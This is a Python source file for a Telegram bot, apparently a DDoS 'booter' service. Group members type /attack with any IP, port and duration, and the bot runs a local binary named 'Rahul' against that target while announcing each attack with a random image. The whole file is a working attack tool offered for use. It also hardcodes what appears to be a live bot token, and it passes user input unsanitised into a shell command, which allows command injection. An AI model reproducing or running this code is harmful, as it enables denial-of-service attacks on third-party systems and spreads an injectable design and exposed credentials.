#!/usr/bin/python3
import telebot
import subprocess
import random
import os
import threading

# Your Telegram bot token
bot = telebot.TeleBot('7735159098:AAFQ9ALIgcScy04REvRwOT3ZL8waDjMUUbA')

# Group details
GROUP_ID = "-4609120968"
GROUP_INVITE_LINK = "https://t.me/+n5oTl7go9kk0NzRl"

# Attack settings
MAX_ATTACK_TIME = 180
RAHUL_PATH = "./Rahul"

# 🎯 Random Image URLs  
image_urls = [
    "https://envs.sh/Err.0.jpg",
    "https://envs.sh/Er9.jpg",
    "https://envs.sh/ErN.jpg",
    "https://envs.sh/Er6.webp",
    "https://envs.sh/Erm.webp",
    "https://envs.sh/Erf.jpg"
]

# Attack status tracking
attack_lock = threading.Lock()
attack_active = False
current_attacker = None

# Function to check if a user is in the group
def is_user_in_group(user_id):
    try:
        member = bot.get_chat_member(GROUP_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception:
        return False

# Function to check if the command is sent in the group only
def is_message_from_group(message):
    return str(message.chat.id) == GROUP_ID

# Function to restrict bot usage to group members & only inside the group
def restricted_access(func):
    def wrapper(message):
        user_id = str(message.from_user.id)

        if not is_user_in_group(user_id):
            bot.reply_to(message, f"🚨 **Join our group first!**\n🔗 [Click Here to Join]({GROUP_INVITE_LINK})", parse_mode="Markdown")
            return
        
        if not is_message_from_group(message):
            bot.reply_to(message, "❌ **You can use this command only in the group!**")
            return
        
        return func(message)
    return wrapper

@bot.message_handler(commands=['attack'])
@restricted_access
def handle_attack(message):
    global attack_active, current_attacker

    user_id = message.from_user.id
    username = message.from_user.first_name

    # Lock the attack status check
    with attack_lock:
        if attack_active:
            bot.reply_to(message, f"⚠️ **Another attack is already running!**\n👤 **Current Attacker:** {current_attacker}")
            return
    
    command = message.text.split()
    
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
        if time_duration > MAX_ATTACK_TIME:
            bot.reply_to(message, f"❌ Maximum attack time is {MAX_ATTACK_TIME} seconds.")
            return
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    # Ensure Rahul is executable
    if not os.path.exists(RAHUL_PATH):
        bot.reply_to(message, "❌ Error: Rahul executable not found.")
        return
    
    if not os.access(RAHUL_PATH, os.X_OK):
        os.chmod(RAHUL_PATH, 0o755)

    # Now, set the attack as active
    with attack_lock:
        attack_active = True
        current_attacker = username

    # Start Attack Notification
    random_image = random.choice(image_urls)
    bot.send_photo(message.chat.id, random_image,
                   caption=f"🚀 **Attack Started!**\n🎯 Target: `{target}:{port}`\n⚡ **Status:** `Running...`\n👤 **Attacker:** {username}",
                   parse_mode="Markdown")

    def run_attack():
        global attack_active, current_attacker
        try:
            full_command = f"{RAHUL_PATH} {target} {port} {time_duration} 900"
            subprocess.run(full_command, shell=True, capture_output=True, text=True)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Unexpected error: {str(e)}")
        finally:
            with attack_lock:
                attack_active = False  # Ensure reset even if an error occurs
                current_attacker = None
            bot.send_message(message.chat.id, f"✅ **Attack Finished!**\n🎯 Target: `{target}:{port}`", parse_mode="Markdown")

    # Run attack in a separate thread
    threading.Thread(target=run_attack, daemon=True).start()

@bot.message_handler(commands=['start'])
@restricted_access
def welcome_start(message):
    bot.reply_to(message, f"🚀 **Welcome!**\nJoin our group first to use this bot:\n🔗 [Join Here]({GROUP_INVITE_LINK})", parse_mode="Markdown")

# Start polling
bot.polling(none_stop=True)
